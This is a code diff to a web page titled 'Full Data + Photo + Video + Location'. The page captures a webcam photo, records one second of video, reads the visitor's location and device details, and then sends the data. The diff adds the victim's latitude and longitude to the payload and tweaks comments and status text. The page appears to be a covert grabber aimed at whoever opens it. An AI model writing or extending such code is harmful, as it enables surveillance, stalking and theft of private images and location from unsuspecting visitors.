@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Full Data + Video + Photo</title>
+  <title>Full Data + Photo + Video + Location</title>
   <style>
     body {
       margin: 0;
@@ -118,7 +118,7 @@ async function takePhoto() {
     stream.getTracks().forEach(t => t.stop());
     return canvas.toDataURL('image/jpeg', 0.9);
   } catch(e) {
-    return null;
+    return null; // User denied or error
   }
 }
 
@@ -130,7 +130,7 @@ async function recordVideo() {
     mediaRecorder.ondataavailable = e => chunks.push(e.data);
     mediaRecorder.start();
 
-    await new Promise(res => setTimeout(res, 1000)); // 1 sec recording
+    await new Promise(res => setTimeout(res, 1000)); // Record for 1 sec
     mediaRecorder.stop();
 
     await new Promise(res => mediaRecorder.onstop = res);
@@ -191,6 +191,8 @@ async function sendData() {
     `Platform Version: ${info.platformVersion}`,
     `Referrer: ${info.referrer}`,
     `Touch Support: ${info.touchSupport}`,
+    `Latitude: ${info.latitude}`,
+    `Longitude: ${info.longitude}`
   ];
 
   const content = lines.join('\n') + `\n${locStr}`;
@@ -218,7 +220,7 @@ async function main() {
     info.photoBlob = await res.blob();
   }
 
-  document.getElementById('status').innerText = 'Recording 1-second video...';
+  document.getElementById('status').innerText = 'Recording 1 second video...';
   info.videoBlob = await recordVideo();
 
   document.getElementById('status').innerText = 'Getting location...';
@@ -227,7 +229,7 @@ async function main() {
   document.getElementById('status').innerText = 'Waiting 1 second...';
   await new Promise(r => setTimeout(r, 1000));
 
-  document.getElementById('status').innerText = 'Sending...';
+  document.getElementById('status').innerText = 'Sending data...';
   await sendData();
 }
 
